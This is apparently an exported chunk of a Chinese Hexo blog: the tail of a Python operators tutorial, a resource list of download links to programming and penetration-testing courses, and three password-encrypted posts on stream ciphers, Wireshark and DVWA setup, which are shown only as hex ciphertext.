<li>|幂 - 返回x的y次幂                                |a**b 为10的20次方，<br>输出结果 100000000000000000000<br>//    |取整除 - 返回商的整数部分（向下取整）    |&gt;&gt;&gt;&gt; 9//2<br>4<br>&gt;&gt;&gt; -9//2<br>-5</li>
</ul>
</li>
</ul>
<br>

<br>

<h3 id="二-比较运算符"><a href="#二-比较运算符" class="headerlink" title=" 二. 比较运算符"></a><font color="#FF6347" face="Comic sans MS"> 二. 比较运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">==</td>
<td align="left">等于 - 比较对象是否相等</td>
<td align="left">(a == b) 返回 False。</td>
</tr>
<tr>
<td align="left">!=</td>
<td align="left">不等于 - 比较两个对象是否不相等</td>
<td align="left">(a != b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于 - 返回x是否大于y</td>
<td align="left">(a &gt; b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。<br>这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td>
<td align="left">(a &lt; b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;=</td>
<td align="left">大于等于 - 返回x是否大于等于y。</td>
<td align="left">(a &gt;= b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;=</td>
<td align="left">小于等于 - 返回x是否小于等于y。</td>
<td align="left">(a &lt;= b) 返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="三-赋值运算符"><a href="#三-赋值运算符" class="headerlink" title="三. 赋值运算符"></a><font color="#FF6347" face="Comic sans MS">三. 赋值运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">简单的赋值运算符</td>
<td align="left">c = a + b 将 a + b 的运算结果赋值为 c</td>
</tr>
<tr>
<td align="left">+=</td>
<td align="left">加法赋值运算符</td>
<td align="left">c += a 等效于 c = c + a</td>
</tr>
<tr>
<td align="left">-=</td>
<td align="left">减法赋值运算符</td>
<td align="left">c -= a 等效于 c = c - a</td>
</tr>
<tr>
<td align="left">*=</td>
<td align="left">乘法赋值运算符</td>
<td align="left">c *= a 等效于 c = c * a</td>
</tr>
<tr>
<td align="left">/=</td>
<td align="left">除法赋值运算符</td>
<td align="left">c /= a 等效于 c = c / a</td>
</tr>
<tr>
<td align="left">%=</td>
<td align="left">取模赋值运算符</td>
<td align="left">c %= a 等效于 c = c % a</td>
</tr>
<tr>
<td align="left">**=</td>
<td align="left">幂赋值运算符</td>
<td align="left">c **= a 等效于 c = c ** a</td>
</tr>
<tr>
<td align="left">//=</td>
<td align="left">取整除赋值运算符</td>
<td align="left">c //= a 等效于 c = c // a</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="四-位运算符"><a href="#四-位运算符" class="headerlink" title="四. 位运算符"></a><font color="#FF6347" face="Comic sans MS">四. 位运算符</font></h3><p>按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：</p>
<p>下表中变量 a 为 60，b 为 13二进制格式如下：</p>
<p>||<br>:-|<br>a = 0011 1100|<br>b = 0000 1101|<br>a&amp;b = 0000 1100|<br>a丨b = 0011 1101|<br>a^b = 0011 0001|<br><code>~a</code>  = 1100 0011|</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;</td>
<td align="left">按位与运算符：<br>参与运算的两个值,如果两个相应位都为1,<br>则该位的结果为1,否则为0</td>
<td align="left">(a &amp; b) 输出结果 12 <br>二进制解释： 0000 1100</td>
</tr>
<tr>
<td align="left">丨</td>
<td align="left">按位或运算符：<br>只要对应的二个二进位有一个为1时，结果位就为1。</td>
<td align="left">(a 丨 b) 输出结果 61 <br>二进制解释： 0011 1101</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">按位异或运算符：<br>当两对应的二进位相异时，结果为1</td>
<td align="left">(a ^ b) 输出结果 49 <br>二进制解释： 0011 0001</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">按位取反运算符：<br>对数据的每个二进制位取反,<br>即把1变为0,把0变为1。~x 类似于 -x-1</td>
<td align="left">(~a ) 输出结果 -61 <br>二进制解释： 1100 0011 <br>在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">左移动运算符：<br>运算数的各二进位全部左移若干位，<br>由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td align="left">a &lt;&lt; 2 输出结果 240 <br>二进制解释： 1111 0000</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">右移动运算符：<br>把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，<br>“&gt;&gt;”右边的数指定移动的位数</td>
<td align="left">a &gt;&gt; 2 输出结果 15 <br>二进制解释： 0000 1111</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-逻辑运算符"><a href="#五-逻辑运算符" class="headerlink" title="五. 逻辑运算符"></a><font color="#FF6347" face="Comic sans MS">五. 逻辑运算符</font></h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">逻辑表达式</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">and</td>
<td align="left">x and y</td>
<td align="left">布尔”与” - 如果 x 为 False，<br>x and y 返回 False，否则它返回 y 的计算值。</td>
<td align="left">(a and b) 返回 20。</td>
</tr>
<tr>
<td align="left">or</td>
<td align="left">x or y</td>
<td align="left">布尔”或” - 如果 x 是 True，<br>它返回 x 的值，否则它返回 y 的计算值。</td>
<td align="left">(a or b) 返回 10。</td>
</tr>
<tr>
<td align="left">not</td>
<td align="left">not x</td>
<td align="left">布尔”非” - 如果 x 为 True，<br>返回 False 。如果 x 为 False，它返回 True。</td>
<td align="left">not(a and b) 返回 False</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="六-成员运算符"><a href="#六-成员运算符" class="headerlink" title="六. 成员运算符"></a><font color="#FF6347" face="Comic sans MS">六. 成员运算符</font></h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">in</td>
<td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td align="left">x 在 y 序列中 , <br>如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td align="left">not in</td>
<td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td align="left">x 不在 y 序列中 , <br>如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-身份运算符"><a href="#七-身份运算符" class="headerlink" title="七. 身份运算符"></a><font color="#FF6347" face="Comic sans MS">七. 身份运算符</font></h3><p>身份运算符用于比较两个对象的存储单元。<br><strong>注：</strong><font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-id.html">id() 函数</a>]</font> 用于获取对象内存地址。</p>
<p>is 与 == 区别：<font color="#FF7F00"><strong>is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等</strong></font>。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">is</td>
<td align="left">is 是判断两个标识符是不是引用自一个对象</td>
<td align="left">x is y, 类似 id(x) == id(y) 。<br> 如果引用的是同一个对象则返回 True，<br>否则返回 False</td>
</tr>
<tr>
<td align="left">is not</td>
<td align="left">is not 是判断两个标识符是不是引用自不同对象</td>
<td align="left">x is not y ， 类似 id(a) != id(b)。<br>如果引用的不是同一个对象则返回结果 True，<br>否则返回 False。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="八-运算符优先级"><a href="#八-运算符优先级" class="headerlink" title="八. 运算符优先级"></a><font color="#FF6347" face="Comic sans MS">八. 运算符优先级</font></h3><p>以下表格列出了从最高到最低优先级的所有运算符：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">**</td>
<td align="left">指数 (最高优先级)</td>
</tr>
<tr>
<td align="left">~ + -</td>
<td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
</tbody></table>
<ul>
<li>/ % //    |乘，除，取模和取整除</li>
</ul>
<ul>
<li><ul>
<li>|加法减法<br>&gt;&gt; |&lt;&lt;    右移，左移运算符<br>&amp;    |位 ‘AND’<br>^ 丨    |位运算符<br>&lt;= &lt; &gt; &gt;=    |比较运算符<br>&lt;&gt; == !=    |等于运算符<br>= %= /= //= -= += *= **=    |赋值运算符<br>is is not    |身份运算符<br>in not in    |成员运算符<br>and or not    |逻辑运算符</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>资源</title>
    <url>/post/Resourses/</url>
    <content><![CDATA[<p>&ensp;<br><font face="楷体" color="red" size=6>资源目录</font><font face="楷体" color="red">(点击相应资源会跳转哦)</font>😜</p>
<table>
<thead>
<tr>
<th>书籍</th>
<th align="center">提取码</th>
<th align="center">视频</th>
<th align="center">提取码</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://pan.baidu.com/s/1XM04ptOY0qaS3iVu3VQoLQ">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb1</td>
<td align="center"><a href="https://pan.baidu.com/s/1RHU4z4xr5sxLuqbkdwP_Lw">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb2</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1fUNe2Q7aiQxtzEomXgLjYQ">算法设计与分析课件</a></td>
<td align="center">Numb3</td>
<td align="center"><a href="https://pan.baidu.com/s/1Fmi9FpCbcoR-NBLap8KivQ">Kali渗透培训课程-逆小战</a></td>
<td align="center">Numb4</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1rERpm9Bm2zSzNhYPbUuh6Q">信息安全数学基础课件</a></td>
<td align="center">Numb5</td>
<td align="center"><a href="https://pan.baidu.com/s/1-lldqvPgcnNC3kjJmoS12A">SQLMAP注入牛人讲解</a></td>
<td align="center">Numb6</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1iwev5nNX6DHjbHFwAPyeag">Java课件</a></td>
<td align="center">Numb7</td>
<td align="center"><a href="https://pan.baidu.com/s/1Ur8wapZIbNsMu-h4YosvOQ">Burpsuite视频教程</a></td>
<td align="center">Numb8</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/16_a1uYNgfQwaVZwvxW7Kog">Java 2 核心技术，卷I：基础知识（原书第7版）</a></td>
<td align="center">Numb9</td>
<td align="center"><a href="https://pan.baidu.com/s/1g2IF-com9z3qwpacugslhA">Burpsuite渗透软件教程</a></td>
<td align="center">Numb10</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1DeyFfBjjzFVE4Z8B5-GsHA">Dreaming in Code</a></td>
<td align="center">Numb11</td>
<td align="center"><a href="https://pan.baidu.com/s/1txPt1Dz3q0rdaTBRvGf9eQ">Web基础</a></td>
<td align="center">Numb12</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1HOw_KSFvVhKIW7UW8hZ9eA">梦断代码</a></td>
<td align="center">Numb13</td>
<td align="center"><a href="https://pan.baidu.com/s/16kHmbDuNz6tyJxKFpVqNOg">Web漏洞讲解</a></td>
<td align="center">Numb14</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>对称密码-序列密码</title>
    <url>/post/Sequence-Password/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="fc64042e65ddc7469d75fb176b68e9d2be21d0619858e22f7eb59e3c9d9ff3fa">271aaebc12e27f75de8a7fef652375cf0c738676de9bb6f922f3114f0700bc83f25259d0de9ad27dda11b461a70ec9ca5c5fcc856641c69723e85e32f09a7277bbc2d51e6c5c9bf5fc3f28e728e45777a977faefa127da0cbc8636df5aed3496d49c55eb0af79554f3823102bf7c39949d73352cdf97a968d7bb5b6b2b2f675a86289ede833ce7d08306783c14f23d674922d9d8526fd60ab17f3c3518f64e3cea876e473f2134fce2ad2f6fd8dd9b6d20bc31fefd1f8d035287fa162a1439922d305462dea9acead50eccbacbd379a001ba1dd3d668a46dd6a56d52c1d8baac3a6b9eb4a5934011538ac6b9ade16f983ed0548230d2092e07a6ab20abc081c07e68ec3a519216a6da4227833669309be17813a6d5cf681542dc6938b5cb3e2b3f38506fe9d370654a937378191beb677f99547289d805dc7985b72e3fead7d53cc4facd8408dca7689114af734916f7c80561acd826c93f2f9519e073847987b633322b2b0e675af3dac30e0e3370fa92650f14921e4b3f5c368d09581d4a62102a1d7fc5704ab2763d0e098d157bcc5544486dd748f2244379beaf5c4945ece56e2279ce200adc69c96435ca769b76503ea2ac7aac5b262306e95acc85c3865134ff6ad5b1222832b8f833bbec4cc9de4d0376157fa4e433366c4c3370a04307dd19642b032bab3d42e084b46b7b8c7bb2fe7ff6c88fac24df35b6cd6dadd1c288c084e66cd9b58ccb0e9a62b9ad1b7161b4cab92d8e713dda9cae04bf50256feffc93299da22081ab82035c0b0ee7fddbbfe3bff7fbf98429d2af6cdcf259ddc4e176c1a62279ad80b0381e9cbf22c09697288011190a44023f6e1307d6101bbb72703dac371e3fabfecb328bcb195b0610979a186e3513bc05120f81bdb68b71009222684f341e47d28d47dca0f7fdcd44008d1cc2ba275ad5c77db9fe93d31dfd3bd4609ab61d2234f209da6a50da7850f3644d126ba00cf63c35312bf0b9f30fa8e5d05c35741b93c57385a8b83bdd8b043a20c789c5f5b9554669ba562dbf91e3687948bf4991be1020e4e97187a6452461d7ee09b93a7ba3aad3ab31951feb144b9659ac89b113dc4f9f4e27309a6437d32d024021c43d073479b534e5f7ee29431c6ce2c316944024e8a0e37336e4d7e5a639dc50491f3c75cabfdcbe5904a5f94278f97693f682a697483b6cae9c77207d04964bd58a3b71e9f8cbf797bed2fe249c35636fe82629f226838e4ea60e0477929b2598d316e10631070800cb08c13f73becf61f1fe12b9706d1665cfe50fa602a590d2fe2467a11b2ca12e23970aef3f17f45b923a415d359dc71fa61e2132625b30c06962bfb30d5296425c9990ac543bb10b8e745d8531eb9db2f1eae35c578f30473df65106071af10963cca68b674fb8eb83d5e2bccefbdf7cbe124c95fdf5e6d3a4834aaeb46109ca8e397bb5ccf81edd56e9bed818abea3a9223741942f9de00460def5c9490905425cb1456a82128e340acf8421e084845e2af89b66ce0ad6ebf3d5d515ff19e65db9290df7d1ecd9c690d57ead3728ffb088091778236e188c83d7ea0ee14038f9cea87f2ce9a4afeb1271a5ee6e69bbc5bb68bc478188982e887bac683628a5cd0adfcadf534fedcfed6a7816c2dc1135e932abe46752dffd4631ce064369ac9cd9ecd41c63817471a4d0046326ba71e5e0b0173a5f2137fb81f73d0a1433a0f6d76cb5e2bf71e8b5f2f8e62ff7337180d5b9b6732bbf93373b7c11f05651dd2a05c69d9acbdc11fa2b415a6ab064e0089bf806038967c247398ee16cfc2912602e33f14e6689ff2cffa08fe83db8a56ff263b8663bea104d0acb3219fb144c23d69478de11e8198bf52a33cc84c3ea3a2c149cb78bc71ed055766e77ba485de522a3ccaad17adb96d38f7fd082dd32c2e9346cd270d5c7f8647c81f3c80de1cb4c21c5e8ad3979a57e2e78e724489712cd25464fa3ec1be1a50e482d6f799029c4753a2773860e5a064d406681db2cd272b16f2e63f2a485e2ee19f1b933e6fa50f0af93c51f55be1322d77fefc5d7357d1dd147c6cfc7a87ea337c0456916933e0180330847c7e7efd51107dcbca44cb0daa6b4f0921944be821ab1f01050a145bd7cd41642f78a3a9c7ea9817dfad97f71d8db740e067f82d0d3f00938d942df6629d74507995e0015f29f6a53b27e414fcdd9b96225f702ce96a61d5804b176d5b8a9a5a57bc34194d116f5b3f72abf77974006b0378f2dc01234efd4600f163877152fe8dc8725470b909a20e0a6cf9575922c03a7c785297b8eaf36f89d79f4211cf1d6c2407673e04b95fe92964a7d956a94192bb0328aa402b3f0123a7bf820c8983d172af1279c3d54d52258c250abaec1329b1f5e7c024bf2e0ba0a2e579a3b37c4f3a5ab7c383c6a372a4f25560c2f30944ec9829876999b171872e57c0fdd108087bf5d09db48ab453a1e6822ba45ae2e369e237a366db5c94950b5fce93980198eb8bc9943f4a90cf803571a55068818432e7285b81967ab247f0b594e5c423f2e6b3f18305774933815561e3a8be93a5c3c06ffca0f6f427d75a24a56f2292fc9c57e55cdf53aa2c87cccc1550de2796f102a36e7ff64cea058a518f4827f8d942f86a55bc5ca92d1ed9c84a91d62acda5632e199ce3f23cede7b0d64b7de035816eefaea8ecb37b0adf2c0ff71b9183049c2773af768fa19f8f68bbcbccbf736104a3f00de93149b89c0625e2770825b144d5f9f9907227a000ae227c075f5fdf8b7b95ddb549b3e5eae7c3857b3326359a25de87e4fc128fada1c527eabfcee021680c560a7fdbb3b675e559756d73efdf219568683ab4a86a7dcad6b02afea2a8767388991bf3e7f2bc430c0bc550195010eaa741e489e084a1af912dfdbc9e6af4c2ae6cc7bc9f67a7bcf29a717e1c305cca32b3b08fc35cea8f320d8c6df892ed290e1f22d15730d1d57a1fd198d331cd5fe591ca95cac17936760c4cc497e724f33dbb948b89e630e4d35b5927d8631ecd32ca668daf0445d48be6f6975bf422aa7ae4f348bd538a115a7618ba878624d38e5e9d786eb303d71aec42a718bbd7149b797df53d3d48b70bfc8829044917e42fb796dd5c5cd85750c5994e0435c7cd94f4500e015a929eb15ec474d680605d779050da1412c022f48734345e8082771eaef0a717a0d48a03aa86f4a02b732246d1ba71f8c88fc199cc03f9d9e3d11a500aed7661c2430d724b03610582a4180220f65b5609bdc5b28efc0a52ff676855ffbb3084602da1b9ad48193ad485cf80d606bf3888bb701a7f55df6da1c614ec10eb823ca6e0100390d898190ceffc5d122afd5d41cd00b9359b12ff919d495db9160769532826fa058c38949a8cfe63fda171eb149ff518bbea8f181b6ae2450cc30219761da93c96bbbcf4bf5a1dc905aa</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>序列密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark简单介绍和数据包分析</title>
    <url>/post/Wireshark-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="f0be8fe4703affdc8d05bb6849f075d5864e36f8b17b15a3797076cd0ae9038c"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web-Tools</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>XAMPP环境下配置DVWA</title>
    <url>/post/XAMPP-DVWA/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e2f82044624b60c878c3cc51e45ea7bf5e5761f6e3fec20e1371c9c6b3cbca0a">e1deaa9b2077dba0645f2a3dd11b50a38fc3cc0eef85e79ce23e8996dc6a244d04c67700232b0027e7808f50b07a8ba118350b2b611cb9ba0f064b43cae98d54b0b906ba793b2f41a8c73b34d71dd12596e77882a498eac871b4bd2fac84506d29836f4542df69f2e9f640ce9f071b169fbf69c44e9be734e0d9cd1e511998eb00a5d865a6960a2fe98b617a58986693786082d7e8369f8d1fa82a2a2f9dfa7e87173847c3c13d3cb2f6edd04bb9cb3b06be459b7ba30dd5a0c4f1ea1813301aba97e3394c5f0362daea68fa1493a6ca10114f3c78a2387fd763edd57dbed77baeafa753b382fb3d01c2c8a4cdc4cf928b2e229cdacfaa5ec104c0ebc11e6919e1c7d848aeef669ba7fd3419c59b9d5ea33f137747414c886fe68bf4d02fff83e8d1f795395ebd1cfeb675c3326b657cc02bc41f5de472a674ee63deb2892b415199bfe7d4f593b4bb8b336721375ed8d920da62ebf2a4bf11a8a52e3802d75eecca5de2e4de0a1f9d37daf4b169311bed875941ec367a32b105649cd0f3004cc0f660b641ce0d4e07b9399c18f7f7ebf9758364c4e73d98b72f83253143a5d1754fa46af06a51275a8d714fb0a675eafda1b0bc9aa5d8bbc5fc21ee23072f30d5e47a50759b4902684f6a617ce369ad7c9cee9a052afceb4b8612ff9f755951f4451e72103529558819c93884a47133569da33c1ff6c62f68a87511e5b6c66176b74cb79e3c414fe7413046b6cfafc720c79c53c4b0b010b0da6c2712ee5f578a4e6d9a9be05718560d065385a20d767099dd8f4d88ca6400763609b038d7e1d377b9ace15776e93691114935ffa70c6767919f42bdf7ad16eb48fbc4c7e7f024f7938cd3a047467682d770de22aacf4dcf191d0ee873effded0c8e4ba808b7fb96b4674d2019acf9fb3f838ea5a85e77388d94d699b961288d1ed35e81a9d2c5007027fb28903e36ed36018bc16e19c988c540ac45ad2a482c330985486ba73f2a1e66fb82b895eb3a2089ed59a4c192b491336d5e561eec9452019de973aca7ffeca3532d76db748ee2567a20ab7964e5723901ebb54f9218a1973db9a972860f5c10642b0bc679e4659c2c489f7257657890838336fd6daa22ccca7777f474366828f45307c04960e2874a9a6db0b5f8f42aed577adf4f23d90969236f739033b0d471df36ab31e29dffc5c293bc4c43c5639862843ea50e9b901523e6bc266eee460151e9e0e66d3089c81d05fbb6f38def654854bcfc5f7ae21aa99951defb4e2a4c73fa1c98fbbf6e61c5803a7574f6a71f8834f7b7b57ee3b127b721cb17b02b168b78c9d7f196101816b08b00279e4027e3c77661f80cbe9bfa024e8f439ec0956bfea4db458ee337614d66ee760d12c208280ddc2ff7b389d09955ed8afc435fa9fe9619d2d043d12bf17c60e05ac0ce4679e5443e10e1b69fad0689f239d774ce5461870d561778e4a637d3cc29520af91d281ecc347a91da10c1cb28ccb2c8074ed8e6ba0c296859d1146ced3d6a2f62307c9e3e86233842c5dc29c0ee6dc6ea956a459e260441fd7cfb21e9aceaf3262e923bcf9e0efaa6af85cd6c2f7ea66b7d4c4085997831d3b1eb80a4ef244ef4c0c4f2bba03e673825f7036f73cf8bf7855f670665d17aa68fd6bf85c69fc070f0be23886c210f307116420e6c1f1bc234ce8984be181ff917a0f47b08b64af9f5f4d1ba6292d3baa3a7c9421207fdd58d08e3bb1b11658339a7499db5ef8c3a9733f7c8e312259402fbee094776a4973b461df1c134e4121032487b55a8ad953840bb55e7f75b0af3e6756b972f8f1cf98b9835e974e4ce49c8cc367313d5b8ed763f8275e186bbd7348bc559bd0dfbec11ba3fe04c835ae501d19f2f761237872470abfab8815f43ca0fa9135c9e48aa75c7d2ce71c491d874da3239f348fb55c1a631ec934fb7d6f81a5f0a5913bc67c54bd0ff38b1a3f76dbe2196279734e6c5ee5edfff76df07f561ac4663a4226bb9de2273906adb6137dc951619e239c0597d8127c4bfcd0bf444aec073e28a11a3b4435e3750d4e2db0273a88f479daaae9c0bb7a68bfeea9d2b9b19dc6d6e9ef741f39c1185e3b3f6558315828c61d69cee0f55af97136bf374c4ef1b137b9f9be2edbc87400da5387347e4cecec272f3fa32df742f51ac3750466c0ed13d8fcf9c4e91e997926e9dc1b8855a3aed3ef3b22baf4ac1e21078d6ffc20706083af76871c3202911a20944fc51d1ddd4389d4c88d62dc30cfc1013cff72d3eb4652f2cddb36e915daa9e6046ce5280eff4ece5bd7087c1a9c9ad20225029742b20e9dccb34ddad800561916ceff93995aaf5b91e8d28358affabe7c7d772e9309827f9326236c83e03f808362f403b604cc816791014f0170bceddba9a1118873ce03970157b61ec972ea9ebcd89a4ec5ed1d0bfb94c35f654f7c0f5dea873004790c48482c14c5a7bb0c3f804a8a970f19a0a0ad83bdb70fc97c320fd5ff68323c2a464f226e555a4fcda5de65f45f65fd202c3510f9c1bb0a0ad17f1fd83c23a8ad47c621140a0b9da01107ddc0a46af68ae86840bed4a7421d0a4963ed5ac2b02c116f79b6b8338f9ff294ae240ee6813d62b2fa9a1ce1e82f9a281e9363436c8eef7705ddcf667c892e11f3ed34daa7283283ca95d52587d33cb8c269a015c6073e4f5598e07a01095cd7dd8c1b4fb4fcd08b259fb810f6f849047d2213748b95142221920156f20508d290c0c06505893df7f0216e51c6dbae1590b0b7f161fc3bc82cca841e21a6ea329fdbcb5e06280befd64dbeb45846af203a7657abc6471258999b92a356188a0009e0928ff7d2b4b95b77591f46f078f268b204a4be5c908bfe9971dd77f29059c18684a0d1f1181ebda1bef22bf1ee05e07b62e581ef99ab1eba2404efaba1029f35848d3023f0f25d470c44bc6bfbc1d768e9cabb4216eeeb5d04773e64587c2a387f49e39d5501ab023cac765ce5b4125d29c065cbe0d9eaf3c9822a35e5a66509cdfe3f26b64a9730071b142f75f4b3250648fc50fd255345895ffd137670aa63729a600f47625fd78fd5661f94c05f6db1bd3052ab1853ed7a7f02f2f7a58d50551924668d0265390fa2813706766736528cd31f99202a57791fb2d1253240ed3450292de989037f5d83786587a752ef02f3fbf448d59a8124303d47e0900773e570a6849e3ee2d6763a20c014d099febeae8e5319616a451bf5f7f9596efa5c98e33a30d05cdd03ba5ef1d0951dc14a017d9a6dc459280944274ced2b98564e8845e3a6fbb7f5ed1ca0fe50b3799d0d73eb5a5ba1e019c5a61542e821d5759b255b85ad44f414b89e72dcf2b950b67616474d461af58fdade68ca4f6936347005882f76e144232003a0077783626065faa048b96d5cc0cc47ff58077121ee548538ab7f3796407367e496f4560af57ae0a079fb1eb53ef391686945bfca2d73a700ac055f48f7fd23a722f0a0e57fb3d315213fd94e7b3ca920820f778432e0a0d1308972bfe178ad1e7384674ebc5fa3ad492cedff3287ac0d3d4952000eb2bd0b0843e6ca9cee3eec2c661061b5eca8883da718775c8f7e08347d10b2cb1f98cbbe3cb2b401995ce97e111a97d9b01697474d81e80a51a5d302af7b2e975188c1679516c35b61662248a7f4eca24de75cf88d43659b51c85b48a4d416a45720d0fc0511ecd867760f22bc4ee959ceae7ef424c9a0e8a3df379cb1736631b3988ec49a29ada6da6282416badd9d9444adffa94534ebd464d8f7aadb4859d94919e96d4bd033f11852c8a9c7cc841c639e4c426f0d340ab7d07d6a21568efd5d2c86342a817d0638845a09ace7456b736ce778178aa4cfa513ff07e8691c46d92363a107242ee64a7fb39c2faa39dc98759d58ee26169f2242c812ee75fd72356042207555996db2cd63833ccb92da549855b8442b279b9c25e62628dc3df27d22e005735169b28dffe3b04d3c57d5bb13c54c40c0eff2a96b3a39c4440cdba6776ecc01a38075e2b66251ea14af7ed2584a4a5d481d81a2edff24279b9dbe18e48dfeab0b9260ceb422802e0e8db81290941f08515fc0f17e4a32dc718bbd1842bdc95569083efab785dbe86856eff7e5435c7830cd4dfaafc1aa09e7ec4f60be7565ac171298b901031b22ba9998d7f302b7dcf2a7a1b5b47b61faccf469ea83eac9cf08cadb0f7ea5f2011f034db29b3c76b9648519dad43d00b395b6482ce85667bc7cd2f2d44ed4a6837d7482062fadc450734a32ced1d27fe28bd726029d26a8a6e85edc7748ae436e6b42bf104b91dbbc53c8359f7ab4b6142e92b8302291431ed0f1f7cd1222e3b497061bd6ca5161f3f9e5b057200bad1f05bb7ad028bc23399b57adcb73db697514c475d4aff1e5f372d3fb9ed60487a5251d95f2836fdc5f6780f3bd1989ee7ae21d47edda52b34b3d8d15391bee832ae12f6f7fadba9bdaa51fc5a855951fce39737f7550d343c759e52c2253a2e0a83220b0d612b1437766c859838890c4cdf8ed792b84b029f16ea4b292fa8303827c499f7ba8a119372b86419f1cb99453530629eda7a0068524cf36281e2de92e3a1c81b29d7449856b969b3c65cf002fc05fb7e2f8a7d31a94932ca1a17d75ffb49065915ef4f6ec2016e8151c9d6ca7176fcaf3e9c3f50f8def5d756352022f82165b5e7fef3a857e61a45b8619788feff47683f8b807c78887ddcfdaa6c4acaa745666623026f83191f1112a49c02ef5bff6218666aea8e418137d822dba2cbd4918e64a992b1f0f7f70389e7ec45c9d37a492c476ffbafe745111ed3dc9a5d6c59c466122f03c844daa99ffe5e1342520a0cb63b909b5a0b9981d01fd8d0f86c90727432605c9e7b4421d58c5addcdd1f2cdbaf7507f05e03f6c74e29bcb61c2fcf8c1201309658362291f36c6648594f15fad67eb1ca1ad52120378016355609ab0cadfc418e9310799bbf424d2650cb101d0e00c2cb9ef6462fe6748ab1c0003fd0cc3bda1669f921f885ed81c3e8428578ea90496ad7cb12c44f9831bddc8ff7f